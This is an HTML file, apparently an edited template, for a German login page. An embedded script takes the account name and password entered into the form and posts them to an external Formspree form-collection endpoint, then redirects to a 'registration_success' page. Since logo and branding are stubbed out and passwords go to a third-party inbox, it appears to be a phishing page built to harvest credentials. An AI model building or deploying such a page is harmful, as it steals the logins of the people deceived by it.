<!DOCTYPE html>
<html lang="de">
<head>
    <!-- ... all your existing <head> content (meta, title, style) ... -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmeldung</title>
    <style>
        /* All your CSS from the first example goes here */
    </style>
</head>
<body>
    <div class="container">
        <header class="logo-container">
            <!-- ... your logo HTML ... -->
        </header>

        <main class="login-box">
            <div class="login-header">
                <h2>Anmeldung</h2>
                <a href="#">Hilfe</a>
            </div>

            <!-- MODIFIED FORM: Added an ID, removed action/method -->
            <form id="contact-form">
                <div class="input-group">
                    <!-- Added an ID to the input -->
                    <input type="text" id="account" name="account" placeholder="Account" required>
                </div>
                <div class="input-group">
                    <!-- Added an ID to the input -->
                    <input type="password" id="password" name="password" placeholder="Passwort" required>
                    <!-- ... your toggle password button ... -->
                </div>
                <div class="options">
                    <label class="remember-me">
                        <input type="checkbox" name="remember"> Angemeldet bleiben
                    </label>
                    <a href="#">Passwort vergessen?</a>
                </div>
                <button type="submit" class="login-btn">
                    â†’ Anmelden
                </button>
            </form>
            <!-- To show status messages from JavaScript -->
            <p id="form-status" style="margin-top: 1rem;"></p>
        </main>
        
        <footer class="page-footer">
            <!-- ... your footer HTML ... -->
        </footer>
    </div>

    <!-- NEW JAVASCRIPT SECTION -->
    <script>
        // Get the form and status elements from the DOM
        const form = document.getElementById('contact-form');
        const formStatus = document.getElementById('form-status');

        // Asynchronous function to handle form submission
        async function handleSubmit(event) {
            // Prevent the form from doing its default submission (which would cause a page reload)
            event.preventDefault();

            // Get the form data
            const data = new FormData(event.target);
            
            // Display a "sending" message to the user
            formStatus.innerText = "Sende...";
            formStatus.style.color = "gray";

            try {
                // Send the form data to your Formspree endpoint using fetch()
                const response = await fetch("https://formspree.io/f/mkgbqeqw", {
                    method: 'POST',
                    body: data,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                // Check if the submission was successful
                if (response.ok) {
                    // Redirect to the success page
                    window.location.href = 'registration_success.html'; // Make sure this file exists!
                } else {
                    // If the server responded with an error, show it
                    const responseData = await response.json();
                    if (responseData.hasOwnProperty('errors')) {
                        formStatus.innerText = responseData.errors.map(error => error.message).join(", ");
                    } else {
                        formStatus.innerText = "Oops! Es gab ein Problem beim Senden des Formulars.";
                    }
                    formStatus.style.color = "red";
                }
            } catch (error) {
                // Handle network errors (e.g., user is offline)
                formStatus.innerText = "Oops! Ein Netzwerkfehler ist aufgetreten.";
                formStatus.style.color = "red";
            }
        }

        // Add the submit event listener to the form
        form.addEventListener("submit", handleSubmit);
    </script>
</body>
</html>